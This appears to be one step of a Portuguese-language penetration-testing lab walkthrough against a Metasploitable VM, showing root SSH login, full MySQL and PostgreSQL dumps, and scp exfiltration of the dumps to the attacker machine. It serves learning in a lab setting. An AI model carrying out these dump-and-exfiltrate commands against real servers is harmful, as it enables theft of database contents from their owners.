# 05. Comprometendo banco de dados com SSH

Após conseguir o acesso ao SSH da nossa máquina alvo (leia <a href="/steps/03_ganhando_acesso_direto_ao_ssh.md">03. Ganhando acesso direto ao <b>SSH</b></a>), vamos obter as informações existentes em cada banco de dados existente na nossa máquina alvo.

Na etapa 1 (leia <a href="/steps/01_exploracao_com_nmap.md">01. Exploração com <b>NMAP</b></a>), descobrimos que existem 2 SGBD's rodando na nossa máquina alvo: o `MySQL` e o `PostgreSQL` (nas portas `3306` e `5432`, respectivamente).

Vamos fazer o dump de TODOS os bancos de dados existentes em cada SGBD e passar-los para nossa máquina para avaliação posterior de seus devidos valores. Vamos conectar como usuário `root` no SSH:

`$ ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.56.102`

Para fazer o dump do `MySQL` <i><b>INTEIRO</b></i>, executaremos o seguinte comando:

`root@metasploitable:~$ mysqldump -u root -p --all-databases > server_dump_mysql.sql`

No processo, irá pedir uma senha, mas não precisa digitar nada. Somente dê <i><b>ENTER</b></i> que o <i><b>DUMP</b></i> irá ser realizado.

Irei disponibilizar uma cópia bruta desse arquivo <a href="../files/server_dump_mysql.sql">nesse link aqui ;)</a>

Agora, para fazer o dump do `PostgreSQL`, precisamos executar uma etapa extra, pois o sistema operacional alvo só permite realizar o acesso ao banco pelo usuário `postgres`. Vamos mudar de usuário, pelo comando:

`root@metasploitable:~# su - postgres`

<b>VOALÁ</b>! - Agora conectados ao usuário `postgres`, vamos realizar o dump do `postgres`:

`postgres@metasploitable:~$ pg_dumpall > server_dump_postgres.sql`

Irei disponibilizar uma cópia bruta desse arquivo <a href="../files/server_dump_postgres.sql">nesse link aqui ;)</a>

E vamos mover o arquivo gerado para o usuário `root`, para ficar mais fácil a cópia dele para nossa máquina via SSH:

```
postgres@metasploitable:~$ pwd
/var/lib/postgresql
postgres@metasploitable:~$ exit
logout
root@metasploitable:~# mv /var/lib/postgresql/server_dump_postgres.sql server_dump_postgres.sql
```

`OBS: O comando pwd serve para retornar em qual diretório você se encontra naquele momento. :)`

Agora, vamos copiar cada arquivo para nossa máquina atacante:

```
$ scp -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.56.105:/root/server_dump_mysql.sql Documents/server_dump_mysql.sql
server_dump_mysql.sql                                                                                                                  100%  822KB  16.2MB/s   00:00
$ scp -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.56.105:/root/server_dump_postgres.sql Documents/server_dump_postgres.sql
server_dump_postgres.sql                                                                                                               100% 1724     1.3MB/s   00:00
```

Com esses arquivos em mãos, a gente consegue ter acesso a <i><b>muitas informações</b></i> comprometedoras e importantes para a continuação de nossos testes de vulnerabilidades.

Conseguimos ver que no `MySQL`, existem 3 usuários <i><b>(TODOS SEM SENHA)</b></i>, que são:

- `debian-sys-maint`
- `guest`
- `root`

E no `PostgreSQL`, existe somente o usuário `postgres` mesmo.

Iremos fazer a exploração de mais dados usando um outro serviço armazenado no servidor web dessa mesma máquina alvo, mas isso ficará para nossa próxima etapa. Vamos pra cima, o céu é o limite - Vamos para nossa próxima etapa!